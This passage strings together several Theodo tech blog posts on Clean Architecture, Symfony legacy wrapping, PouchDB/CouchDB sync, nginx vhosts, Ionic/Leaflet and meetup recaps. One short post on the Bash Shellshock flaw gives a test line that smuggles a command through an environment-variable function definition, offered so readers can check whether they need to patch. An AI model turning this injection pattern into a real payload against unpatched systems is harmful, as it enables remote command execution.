I won’t lie, there is a cost to it, we need a huge amount of classes to develop, so the feature cost is higher than in a simpler architecture.
But, the experience of Romain with this architecture set up at openclassrooms shows that the benefit is that the feature cost tends to increase really much more slowly over time.
Controller
The controller layer is in charge of getting the request, it can be a Symfony Controller, or a Command, or an API Controller. It’s in charge of sending requests to use cases.
Presenter
The presenter is in charge of getting responses from use cases, and render views from it. Views can be HTML pages, a file, a printed document etc. In Symfony apps, the controller is in charge of this responsibility.
The frontiers
The only things allowed to go through the layer borders are simple DTO.
This ensures the maximum decoupling of the layers as they cannot transmit logic between them.
Can you stop using big words and show us some code?

Romain’s talk is far from being a job half done.
Here is the code used in his slides to present the difference between 4 architectures in a Symfony app context:

MVC
N-tiers
DDD
And finally Clean Architecture

I can’t stress this enough, but the talk slides (in French) are amazing and provide great explanation for these examples.
I want to try it at home, or at work!
A warning first.
Be sure to understand that Clean Architecture is a tool, it’s not a miracle.
There are situations where this tool is not very fitted, and it’s important to know when you should use it.
The first thing you need is a complex architecture, to leverage the entry cost.
So if you’re developing a POC, now is probably not the best time to use Clean Architecture.
Be sure that complexity is inherent to your product and required for it to work.
Be sure to have a team ready for this (even a team of one!).
It requires discipline to write interfaces for nearly everything, to put the logic where it belongs, to respect the layers boundaries etc.
A strong review process and pair programming (and open minds!) help a lot to instill the architecture in everyone.
Be ready to dig into the mud.
Clean architecture is incredibly recent, and unstable.
There is neither a lot of literature, nor a lot of feedbacks on the subject.
Be ready to make it evolve, you will be part of the shaping, you will need to iterate.
Everything won’t be granted, and there is a chance of failure, so assess your risks carefully.
On the other hand, it integrates very well with agile methodologies and with TDD.
I’m sure, I really wanna use Clean Architecture. How do I start?

Great! Romain presented us a very nice PHP implementation of Clean Architecture he developed at openclassrooms.
I encourage you to try it and contribute to it.
This is just an introduction to Clean Architecture, and some concepts might not be obvious to everyone, so if you need, ask Romain, he’s a very nice person!
And for people using Symfony, try the bundle!
Other resources
From Robert C. Martin (a.k.a Uncle Bob), the creator:

Talk
Blog entry


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Roussel
  			
  				After graduating from l'École Normale Supérieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  			
  		
    
			

									"
"
										At Theodo we have had several projects consisting of adding new features to an existing PHP code using Symfony1, CodeIgniter or homemade frameworks.
Rewriting these applications from scratch would be very costly and dangerous for the businesses. Therefore, we prefer
embedding the legacy code in a full-stack Symfony2 project.
By doing so we can write the new features in a the Symfony application and, if needed, migrate legacy code gradually.
Theodo Evolution
The principle is quite simple:

let Symfony return a response to the incoming request
if there is no matching route, delegate the request to the legacy application
and, if still no matching, return a 404 response

Theodo Evolution is a set of tools combining the practices we have been using for several years to extend legacy applications.
In the rest of this article, I will provide a brief introduction to this bundle.
Overriding the RouterListener
Theodo Evolution interferes by overriding Symfony’s RouterListener:
namespace Theodo\Evolution\Bundle\LegacyWrapperBundle\DependencyInjection\Compiler;

class ReplaceRouterPass implements CompilerPassInterface
{

    public function process(ContainerBuilder $container)
    {
        if ($container->hasDefinition('theodo_evolution_legacy_wrapper.router_listener')) {
            $routerListener = $container->getDefinition('router_listener');

            $definition = $container->getDefinition('theodo_evolution_legacy_wrapper.router_listener');
            $definition->replaceArgument(1, $routerListener);

            $container->setAlias('router_listener', 'theodo_evolution_legacy_wrapper.router_listener');
        }
    }
}

This custom RouterListener starts by delegating the request handling to Symfony’s RouterListener.
If the request does not match any controller, the legacy listener catches the NotFoundHttpException and asks the LegacyKernel to handle it:
namespace Theodo\Evolution\Bundle\LegacyWrapperBundle\EventListener;

class RouterListener implements EventSubscriberInterface
{
    public function onKernelRequest(GetResponseEvent $event)
    {
        try {
            $this->routerListener->onKernelRequest($event);
        } catch (NotFoundHttpException $e) {
            if (null !== $this->logger) {
                $this->logger->info('Request handled by the '.$this->legacyKernel->getName().' kernel.');
            }

            $response = $this->legacyKernel->handle($event->getRequest(), $event->getRequestType(), true);
            if ($response->getStatusCode() !== 404) {
                $event->setResponse($response);

                return $event;
            }
        }
    }
}

LegacyKernel
Symfony’s Kernel is an implementation of the HttpKernelInterface and therefore has to be able to tell how to transform an incoming Request to a Response object.
The same is true for the LegacyKernel. In addition, the LegacyKernel should also know how to autoload the legacy application.
(For detailed information on autoloading take a look at the autoloading guide)
If your are about to wrap a Symfony 1.4 or a CodeIgniter application you are lucky, Theodo Evolution provides you an extension of the abstract LegacyKernel class.
Otherwise it’s your job to implement the boot and handle functions. Before you start, have a look at the Symfony14Kernel
and CodeIgniterKernel classes.
As I said, the basic idea is quite simple: if Symfony cannot handle the incoming request let your legacy application take care of it.
However, in practice there is lot to do:
Autoloading, sharing the authentication and the database, managing legacy assets, harmonizing the layout, routing between the two applications, etc.
More about these topics soon!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Kinga Sziliagyi
  			
  				  			
  		
    
			

									"
"
										In some of our projects, we need to build mobile applications that can be used offline. In this article, Valentin presented a fast way to develop native applications for both iOS and Android using a single code base in JavaScript. This time, instead of writing native applications, we thought that the current mobile browsers were performant enough to efficiently run JavaScript.
Thanks to that choice, the application is closer to what we are used to develop everyday at Theodo, and we can use cool technologies such as NodeJS, AngularJS, Gulp… (some Theodoers wrote some articles on these subjects like this Angular tutorial or this Gulp book).
But there are still some questions to answer. The main one concerns data circulating in our application. Indeed, most of the features of our application can be used offline (the joy of working with a client-side language :-)), but it is worthless if all the work made at this moment is lost or unavailable for other users.
Thus, we were looking for a way to store data when you are offline and to make it available when you are back online. PouchDB does exactly that. This JavaScript library works the same way as a CouchDB database and enables data replication between a server-side database and a client-side database.
But, first, what is CouchDB ?

CouchDB is an open source NoSQL database using JSON to store data. It is a document-oriented database that can be requested by HTTP.
In other words, if you have a CouchDB instance running in your local environment on the port 5984 and you want to see the document having the id ‘document_id’ on the database ‘test’, all you have to do is make a GET request on the URL :
    http://localhost:5984/test/document_id

Then, the response will look like this:
    {
        ""_id"":""document_id"",
        ""_rev"":""946B7D1C"",
        ""subject"":""CouchDB presentation"",
        ""author"":""Yann"",
        ""postedDate"":""2014-07-04T17:30:12Z-04:00"",
        ""tags"":[""couchdb"", ""relax"", ""nosql""],
        ""body"":""It is as simple as this to retrieve a document from a CouchDB database!""
    }

As you may guess, it is as easy to create, update or delete a document, by making a POST, PUT or DELETE request to the database.
CouchDB comes with other features, like the possibility to define filters. For instance, if I have a CouchDB database containing a set of messages whose author can be Alice or Bob, and I define the following document:
    {
        ""_id"": ""_design/app"",
        ""_rev"": ""1-b20db05077a51944afd11dcb3a6f18f1"",
        ""filters"": {
            ""name"": ""function(doc, req) { if(doc.name == req.query.author) { return true; }
                     else { return false; }}""
        }
    }

On this URL :
    http://localhost:5984/db/_changes?filter=app/name?author=Alice

I will see all the documents matching the filter ‘name’ with ‘Alice’ standing for the parameter ‘author’, another way to say that the response will contain all the messages written by Alice!
But we haven’t seen yet the main reason of why CouchDB should be chosen over any other database system for our initial needs. This choice is driven by the fact that CouchDB is made to easily replicate databases. At the end of a replication between two CouchDB databases, all active documents on the source database are also in the destination database and all documents that were deleted in the source databases are also deleted (if they existed) on the destination database.
You should not be afraid to override important data that you want to keep during this process, each document comes with a revision id, and all the history of a document is stored and available. It’s up to you to handle conflicts that can be introduced by incompatible changes made by different users on a database.
Now that we have seen how CouchDB can be used, let’s see how PouchDB can be used in our project, and how he interacts with CouchDB.
PouchDB, the JavaScript database that syncs
First, to install PouchDB you can use npm, bower or simply download the sources if you don’t use any of these tools (I recommend you to use them).
Once ready, you will see that creating a new PouchDb database is as simple as:
    var db = new PouchDB('dbname');

The CRUD operations are also intuitive to write, for instance the method used to fetch a document is
    db.get(docId, [options], [callback])

For other methods you can believe me or check their documentation there. I will just emphasize on the method permitting to replicate from or to a distant CouchDB database
    db.replicate.to(remoteDB, [options]);
    // or
    db.replicate.from(remoteDB, [options]);

Given all these tools, we build our application following this general architecture:


After being authenticated by the server, we create a new PouchDB database and we replicate this user’s data from the CouchDB database running on the server, thanks to a filter similar to the one presented earlier.




When a user is logged, all his actions are stored in the PouchDB database. When it is possible (i.e if the user is online), a process of continuous synchronization sends all the PouchDB data to the CouchDB database and vice versa.



Just before user logout, we launch one last time a replication process from the PouchDB database to the CouchDB one, then we destroy the PouchDB database.

It works like a charm, but you have to be cautious about some issues. First, even if it is possible to do it, it is not recommended to store your attachments in a PouchDB or a CouchDB database. As explained in this article, it fattens your database and makes the login replication last much longer.
Next, be restrictive about the data you replicate. The lighter it is, the faster it will be to replicate or request in. For example, use your CouchDB filter only for the last revisions of your documents by using the ‘?style=main_only’ option in your request. The idea is to avoid outdated documents that are not compatible anymore with your code.
To conclude with, thanks to PouchDB we manage to build an application that could store data locally while it’s offline, and send it to a central CouchDB database as soon as it is online. Enjoy it, and if you need any extra feature, develop it and make a Pull Request to the GitHub project!
Bonus
How can I migrate A MySQL database to a CouchDB one?
If you consider writing a new app using CouchDB for an existing business, with its existing SQL database keeping these data is a key point. A way to do it is to use of the Node.js library cradle. It is a CouchDB client that allows every operation that we are used to make with CouchDB. Coupled with a MySQL client such as node-mysql, it is possible to make a MySQL query, and store all that you need in new CouchDB documents. Run this task periodically and your CouchDB database will be “in sync” with the MySQL database.
Be aware to save a new CouchDB document only if it was modified. CouchDB stores all the revisions of a document, save documents when they are unmodified will increase the database size without any valuable reason. The following script can be used as a skeleton (it is written in CoffeeScript):
_       = require 'underscore'
yamljs  = require 'yamljs'
mysql   = require 'mysql'
cradle  = require 'cradle'

file    = fs.readFileSync(__dirname + '/../config.yml', 'utf8')
options = yamljs.parse(file)

connection = mysql.createConnection(
  user:     options.mysql.user
  password: options.mysql.password
  database: options.mysql.db
)

query = """"""
        SELECT * FROM ... WHERE ...
        """"""

db = new (cradle.Connection)().database(options.couchdb)

connection.query query, (err, rows, fields) =>
    throw err  if err

    _.each rows, (row) ->
        _.map row, (field, key) ->
            try
                row[key] = decodeURIComponent(escape(field)) if _.isString(field)
            catch error
                console.log ""#{error} | #{field}""

        newDocument =
            user:
                firstname:  row.firstname
                lastname:   row.lastname
                username:   row.username
            location:
                address:    row.address
                city:       row.city
                postalCode: row.postalCode
                country:    row.country

        db.save(newDocument)

How does PouchDB work?
To store the documents locally, PouchDB uses the database embedded in the user’s browser. By default, it will be an IndexedDB database in Firefox/Chrome/IE, WebSQL in Safari and LevelDB in Node.js.
According to the browser, different size limits exist for this local database, but as long as you stay with JSON documents and small attachments you don’t have to worry for it.
You can override this choice by creating your PouchDB database this way :
var pouch = new PouchDB('myDB', {adapter: 'websql'}); // can also be idb, leveldb or http
if (!pouch.adapter) { // websql not supported by this browser
  pouch = new PouchDB('myDB');
}

For most of its operations, PouchDB operates as an intermediate between a JavaScript app and these local databases. However, it interacts differently during the process of replication, where PouchDB should be able to communicate with a CouchDB database for instance. Moreover, in the case of a continuous replication, it would be better to replicate only the last changes made in the source database.
Actually, an incremental id is given to every modification on a PouchDB or CouchDB document. These ids are used as checkpoints in the process of replication. After checking all the changes between the last checkpoint replicated and the last change made, these modifications are sent by batches to the destination database. Each batch is processed one by one, and the id of the last change replicated of a batch is marked as the new checkpoint.
This way, the replication process only copies the changes needed.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Yann Jacquot
  			
  				Yann Jacquot is an agile web developer at Theodo.  			
  		
    
			

									"
"
										Today a major security vulnerability has been found in GNU Bash. Bash is used by almost every Linux AND Unix systems.
Ubuntu and Mac OS are examples of OS using it. It’s highly advised to update your OS.
If you want to know more about this, you should read this article.
How can I checked if my OS is vulnerable?
This command line can tell you if your OS is vulnerable.
env x='() { :;}; echo vulnerable' bash -c 'echo this is a test'

If you see “vulnerable” printed then you need to update the bash of your system.

(Image from Robert Graham)
How to fix it?
Some patches has been released so you can already update your Bash version to a safer one but they haven’t fixed all the problems. You can check the current status of patches for Ubuntu here.
Once they will have fixed it, you will be able to update to a safe version of Bash.
For Ubuntu you just have to update your bash package:
sudo apt-get update && sudo apt-get install bash

Mac users should have a look at this post
Sources:

http://seclists.org/oss-sec/2014/q3/649
http://askubuntu.com/questions/528101/what-is-the-cve-2014-6271-bash-vulnerability-and-how-do-i-fix-it


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										Ionic is a great tool to bootstrap mobile applications easily. It is a framework based on Cordova and AngularJS and it provides some command line tools, mobile-ready directives for common components, and CSS for a basic application look and feel.
We use it together with LeafletJs. Leaflet is a robust OpenStreetMaps based map library, that makes integrating maps in your application a breeze. It is compatible with computer browsers as well as mobile devices.
If you are going to use them you need to know some basics about how mobile touch events are managed. It will spare you some nasty bugs.
Both libraries use dedicated modules to manage mobile touch events. The modules have two tasks – managing ""click"" events and working around known bugs.
The first usage is managed by code like this. As you can see, a click event is launched even on tap (touchdown) so you can use it for both desktop and mobile purposes. This give a nice compatibility, especially for third party libraries.
It contains some heavy logic to differentiate the click from drags and so on, but it is basically that.
The other is mostly about avoiding a multiclick on Android devices. Sometimes Android launches multiple events instead of one and this can cause your listeners to be called twice. This is managed by comparing the time since last event.
Both libraries implement the logic a bit differently, so they are not always compatible. This can cause bugs, like Leaflet buttons not working etc.
The solution was implemented by Ionic – you can disable its touch events management by adding a special attribute on your map container:

<div data-tap-disabled=""true""> <div id=""map""></div> </div>

This will completly disable Ionic part of event management and Leaflet will be able to handle all by itself.

Hope this article spares you some headaches!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										The purpose of this article is to explain the basic things you’ll need when you start using nginx. I will assume that we are on a ubuntu Trusty(14.04) OS, I let the readers translate the command for their own OS.
Why Nginx?
Nginx is the “new” popular webserver that competes with Apache. So why use it?
Let’s take a quote from the wiki:
“Apache is like Microsoft Word, it has a million options but you only need six. Nginx does those six things, and it does five of them 50 times faster than Apache.”
— Chris Lea

Installation and useful commands
It’s very simple on ubuntu:
$ apt-get install nginx

If you need to run some PHP you need to also install FPM
$ apt-get install php7.0-fpm

Then you can manage it with the classic services commands like:
$ service nginx start
$ service php7.0-fpm restart

If your nginx webserver doesn’t start, you may have a problem in your conf. To have more info you can test your nginx conf with this command:
$ nginx -t

If everything is good you should see something like:
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful

Some basic vhosts
I will now show you some vhosts and explain their use cases but first let’s have a look in the /etc/nginx/nginx.conf file. By default there are already basic settings.
user www-data;

This line means that Nginx will run as the www-data user (as Apache usually does).
If you continue through the file you can see where the logs will be recorded by default, and then you have those lines
##
# Virtual Host Configs
##

include /etc/nginx/conf.d/*.conf;
include /etc/nginx/sites-enabled/*;

As you have guessed, thoses lines include all conf from conf.d directory and all vhosts defined in sites-enabled. Therefore all the vhosts files below need to be in the sites-enabled directory and will be automatically loaded in nginx (after a reload or restart).
How to host a basic html website
If you only need to serve html pages. All you need for your vhosts is:
server {
    listen      80 default_server;
    root        /var/www/;
}

It creates a default webserver that listens on the regular port 80 where basic http requests from browsers come. It also indicates that the root of your website is located at /var/www/. To display your website you only have to create a /var/www/index.html file and it will work.
Basic html website with a server_name
If you want to host many websites on the same machine. You need to use server_name directive so nginx can know which files it has to serve.
server {
    listen      80;
    server_name www.myamazingwebsite.com;
    root        /var/www/myamazingwebsite/;
}

server {
    listen      80;
    server_name www.notsobadwebsite.com;
    root        /var/www/notsobadwebsite;
}

You can also use it to protect yourself against people who create a fake domain name for your website. Like if your dns is like that:
myamazingwebsite.com.        A      173.194.41.191

Someone can buy “thisisashittywebsite.com” domain name and create this DNS A record:
thisisashittywebsite.com.    A      173.194.41.191

And people going on thisisashittywebsite.com will see your website unless you specified a server_name.
More informations about server_names
Basic PHP website
If you need to run some PHP pages, you will need to use the FastCGI-server.
server {
    listen 80;
    server_name nginx-php.demo;
    root        /var/www/php/;

    location ~ \.php {
        fastcgi_index index.php;
        fastcgi_pass unix:/var/run/php5-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}

We use location directive to tell nginx that urls matching *.php need to use fastcgi. The fastcgi_pass tells nginx the socket on which FastCGI-server is listening.
Symfony website
This is an example conf for symfony websites in dev mode.
server {
    listen      80;
    server_name nginx-symfony.demo;
    root        /var/www/symfony/web;

    #We add the logs
    error_log /var/www/symfony/app/logs/nginx.error.log;
    access_log /var/www/symfony/app/logs/nginx.access.log;

    #We activate gzip
    gzip            on;
    gzip_min_length 1000;
    gzip_comp_level 9;
    gzip_proxied    any;
    gzip_types      application/javascript application/x-javascript application/json text/css;

    #default index
    index app_dev.php;

    #So we don't have to see the app_dev.php or the app.php of symfony
    try_files $uri @rewrite;
    location @rewrite {
        rewrite ^/?(.*)$ /app_dev.php/$1 last;
    }

    location ~ ^/(app|app_dev)\.php {
        fastcgi_index $1.php;
        fastcgi_pass unix:/var/run/php5-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;

        # Added to avoid 502 Bad Gateway errors
        fastcgi_buffer_size 512k;
        fastcgi_buffers 16 512k;
    }

    #HTTP 304 NOT CHANGED 
    location ~* \.(css|txt|xml|js|gif|jpe?g|png|ico)$ {
        expires 1y;
        log_not_found off;
    }
}

Https website
If your website needs secure communications between your server and the client, you will need to enable ssl on your webserver. The vhost below redirects every http requests to the https equivalent. It also configures your server to use a custom certificate that you would have put in the conf.d directory.
server {
    listen      80;
    root        /var/www/https;
    server_name nginx-https.demo;

    #Permanent redirection
    return 301 https://nginx-https.demo$request_uri;
}

server {
    listen      443 ssl; #default https port
    root        /var/www/https/;

    access_log /var/log/nginx/https.access.log;
    error_log /var/log/nginx/https.error.log;

    server_name         nginx-https.demo;
    ssl_certificate     conf.d/myssl.pem;
    ssl_certificate_key conf.d/myssl.key;
    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers         ALL:!EXP:!LOW:!DSS:!3DES:!PSK:!aNULL:!eNULL:!RC4:HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers   on;
}

Most of the time, for production you won’t generate your custom certificate but you’ll buy one. Have a look at the nginx’s documentation for more information.
Reverse proxy

There are many cases where you can need a reverse proxy. Nginx is known to make it very easy the use of reverse proxies. At Theodo, we use it in most of our AngularJs apps that call a node server through a reverse proxy.
Here is an example where everything is proxified to the 8080 port.
server {
        listen 80;
        server_name nginx-proxy.demo;

        #Every url starting by '/' are proxified to 127.0.0.1:8080
        location / {
                #You can specify which dns server or /etc/hosts file to resolve the domain
                resolver localhost; 

                #Set the header to keep the IP of the client
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

                proxy_pass http://127.0.0.1:8080;
        }
}

#You can put here a lot of services that don't listen to the port 80. Like a node server.
server {
        listen 8080;
        root        /var/www/simple-proxy/;

        access_log /var/log/nginx/proxy.access.log myCustomLog;
        error_log /var/log/nginx/proxy.error.log;

}

The proxy_pass directive is the most important directive. It’s here that you specify the machine and the port where you want to proxify the request. Behind a proxy, you might want to modify the way your logs are recorded. I have here chosen a custom format for the access_log.
You can create your own log_format by creating a myCustomLog.conf file in the conf.d directory
log_format myCustomLog 
    '$remote_addr forwarded for $proxy_add_x_forwarded_for - $remote_user [$time_local] '
    '""$request"" $status $body_bytes_sent '
    '""$http_referer"" ""$http_user_agent""'
    'real_ip $http_x_real_ip';

Here is a quick list of nginx variables that you can use (The complete one is here).

$remote_addr        The remote host
$remote_user        The authenticated user (if any)
$time_local         The time of the access
$request            The first line of the request
$status             The status of the request
$body_bytes_sent    The size of the server’s response, in bytes
$http_referer       The referrer URL, taken from the request’s headers
$http_user_agent    The user agent, taken from the request’s headers

Sandbox
We have seen some examples of nginx vhosts that will cover most of your basic needs. I have also made a sandbox with Vagrant and Ansible to allow you to easily test different nginx configurations. There is even a little exercise in the README.
If you have some ideas for pertinent vhosts or exercises don’t hesitate to make a PR!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										
When my friend Cyril and I arrived at Theodo, we were amazed to see that although everybody knew we were big into the open-source scene, nobody here really knew about each other’s actual contributions. And these guys play cards every day!



Cyril and me at Theodo
 

Since we heavily rely on open source initiatives for all of our projects, and contribute to these projects to enhance, fix or provide new features, we thought it’d be a good idea to show it … and share everything with our followers. So we decided to set up a page with all the relevant information : contributions, speeches and the conferences we sponsored. It’s simply called open-source.theo.do and, I quote our friends here “it’s awesome”.


The list is automatically updated once a day: we rely on Ohloh.net to get everything about the open source projects of our developers. Some of them still have to register but we already have quite a lot to show.
Technically, we used angular.js for the interface, it’s amazing how simple and powerful it was to use for our project. And single page apps are so nice! For fetching the data, we use Node.js: it was perfect for our use and blazing fast to setup.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Florian Rival
  			
  				  			
  		
    
			

									"
"
										I attented the first London ansible meetup and I wanted to share the few things I’ve learnt over there.
TL;DR: Ansible is S-I-M-P-L-E that’s why you should try using it.
Ansible VS Puppet
One of the talk was about how to move from Puppet to Ansible. At Theodo we use both to provision our servers, as an active member of the Ansible team I was quite excited to discover some new pro Ansible arguments.
So Ali Asad Lotia explained why they moved from Puppet to Ansible in his company.
Their goals were mainly to simplify the process. This talk from Rich Hickey have convinced them about the importance of simplicity.
One of the main problem when using Puppet is the awful log error.

Why they have chosen Ansible?
Minimal requirements
Small composable module set
Use of ssh
Infrastructure as configuration

Their Early Observations
No setup
Module's name map to commands
Failure on error \o/
Easier to read
Lower maintenance

Greg’s show
The last talk was a speech of the very sympathic and funny Ansible’s community guy, Greg DeKoenigsberg with a long questions/answers session.
Mainly everybody was enjoying Ansible because of his simplicity. I have probably heard “Ansible is so simple” a hundred times (per minute).
One question was what is the main purpose of using Ansible? The answer from Greg is that Ansible is an automation tool so it can be used to automate anything not only the provisioning of a server.
One problem that my french neighbor had was that he can not check the compliance of his servers with Ansible as it can be done with Puppet. The answer from Greg was Ansible Tower!
Finaly I’ve asked a question about how the Ansible’s team see Ansible Galaxy. For Greg, it’s just a tool that centralized public Github Ansible’s roles. It hasn’t the goal to become
a composer/npm like service.
That’s it for this meetup. You can check out my roles on Ansible Galaxy or those from my colleague Simon
If you have any questions, you can comment this article or poke me on twitter!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										It is just a little heads up – I have published a small Extension for Behat 2 days ago.
It helps optimize your behat steps by displaying the time taken by every step in console log.
You can check it out on Github: TheodoBehatProfilingExtension.
The current version is compatible with Behat 2.4+ but a Behat 3 version will be coming soon.
If you have any comments or feature requests don’t hesitate to open an issue on GitHub.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										Je suis allé jeudi 23 Octobre au 3ème meetup pour la décentralisation du web à la Fondation Mozilla de Paris.
Au menu, pas de présentation de techno mais une profonde réflexion sur le devenir d’internet à travers deux conférences : Framasoft sur Degooglisons le Net et Laurent Chemla sur CaliOpen.
Pour ceux qui ont loupé cette super soirée, pas de souci : une redifusion des confs est disponible sur air.mozilla.org et un compte-rendu est en construction sur framasoft.org.
En deux mots :
I) Pierre-Yves Gosset nous a présenté Framasoft. C’est une plateforme informative sur les logiciels libres qui cherche à :

sensibiliser à l’utilisation de logiciels libres avec leur site
démontrer que le libre ça marche en proposant leur utilisation directement sur leur site
essaimer en incitant les gens à faire leur propre installation des ces logiciels

II) Laurent Chemla, le premier pirate informatique à avoir été condamné par la justice française, nous a présenté CaliOpen. C’est un futur nouveau service de mail qui ressemblera à ce que Google cherche à faire avec Inbox : un service centralisé de moyen de communication privé. La plus-value de CaliOpen sera la cotation par un “privacy index” (un indice de confidentialité) de nos contacts et plus largement de tout le contenu du service. Un utilisateur qui utilise PGP pour encrypter ses mails aura une bonne note tandis qu’un utilisateur de Gmail résidant aux États-Unis aura une note désastreuse.
Voilà 2 petites citations de Laurent Chemla pour finir :
On estime qu’ECHELON, l’ancêtre de PRISM a rapporté 25 milliards de dollars en contrat
L’objectif n’est pas d’être sûr à 100%, ça n’existe pas. On cherche juste à démultiplier les coûts de l’espionnage.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Raphaël Dubigny
  			
  				Raphaël is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  			
  		
    
			

									"
"
										I went to ParisJS meetup at Deezer headquarters last Wednesday with fellow colleagues Aurélie and Valentin. There were some awesome talks, so I’d like to give you some lightning advertising about them.
The program (in French).
1st talk: Khalid Jebbari (GitHub, Twitter), meetup organizer, on GSS
Khalid spent most of his talk gunning down CSS on the basic things you want to accomplish simply but are forced to use dirty hacks (centering, here I come). A few people in the audience felt the need to defend it afterwards  The problem he said is that when you’re thinking of the layout, you’re not thinking in a flow way but in a constraint way: I want to position my element relatively to another one.
Solution? GSS! Strongly inspired from Apple (still leading in design) Cocoa Autolayout, it uses constraints to compute the best layout possible based on them. DOM items are positionned absolutely and moved to their right place through CSS transformations. The project is not very mature, and the syntax sure feels heavy, but for once the paradigm can really bring back together a lot of front-end developers and layout.
His notes (in French): gss-paris-js
2nd talk: Jean-Loup Karst (Twitter) from breaz.io on statistics on technologies used by French start-ups
breaz.io is a company that bring together very passionate developers and French start-ups looking forward to recruiting them. Thanks to their business, they gather a lot of data on this ecosystem, especially on the leading technologies among them. We learnt for example that PHP is still a huge backend technology for start-ups, but not as much as it is for the rest of the world (40% vs. 80%). Some global outsiders really shine in the French start-up world (Python, Node.js, Ruby). For front-end, the observations are equivalent, Angular.js surpasses jQuery, and we’re very happy at Theodo to have developed a lot of applications lately with Angular.js.
Unfortunately, I felt the statistics lacked some significativity. I would have loved to have more confidence intervals (even just guessed) to draw more accurate conclusions from the graphs.
Related post in breaz.io blog: Back stack French tech inventory
3rd talk: Gabriel Majoulet (Github, Twitter) from Brawker on Bitcoin applications in JavaScript
Gabriel explained (in a very simplified way for us newbies) how Bitcoin and block chain transactions work. The aim of Bitcoin is to build a decentralized monetary system (partly) for security reasons, this goal is really undermined when we use huge platforms like Mt. Gox because they represent a single point of failure. We saw how it went for them. JavaScript has a central role to play in Bitcoin applications: you don’t wont to store and use users clear private keys on your app server anymore. If you don’t know anything then being hacked has no hard consequence. The solution is to store encrypted private keys on the server that the client can request and decrypt with his password and do Bitcoin operations directly from the browser without the server ever seeing a clear private key.
The subject is very passioning and security questions arise and really are interesting to discuss. For example, how do you know the JavaScript you’re being served by the website is not a counterfeit? We can use PGP to ensure content is harmless, but not in an automatic way at the present moment.
His slides: parisjs-40-deezer-france
Lightning talk: Freddy Harris (GitHub, Twitter) on Hello.js
Freddy briefly presented Hello.js, a JavaScript library for client-side OAuth authenticating. It is already configured with some major websites (Facebook, Google, Twitter…) and you can add a new one very easily. It supports OAuth 2.0 implicit grant, OAuth 2.0 explicit grant and OAuth 1.0 and OAuth 1.0a.
His slides: hello-presentation
Conclusion
I will definitely keep going to ParisJS meetup and I enjoin all the other Paris front-end (or not) developers to come and share some good time with us!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Roussel
  			
  				After graduating from l'École Normale Supérieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  			
  		
    
			

									"
"
										I made a talk at one London Symfony2 meetup about how you can easily build up a nice devops environment with Vagrant and Ansible. The slides and the video are available. Feedback is very much appreciated.
As we work more and more with Ansible, we have also started a list of our favorites roles we use for our Symfony2 projects.Feel free to suggest yours so we can improve it!


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										At Theodo we face various issues, and sometimes it starts at the very beginning of the day.

